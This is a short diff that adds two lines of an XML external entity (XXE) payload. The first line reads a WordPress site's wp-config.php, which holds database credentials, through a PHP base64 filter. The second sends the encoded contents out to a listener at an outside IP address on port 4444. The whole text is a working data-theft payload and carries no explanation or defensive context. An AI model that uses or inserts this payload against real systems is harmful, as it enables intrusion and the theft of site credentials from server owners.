@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php">
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://192.168.220.127:4444/?p=%file;'>" >
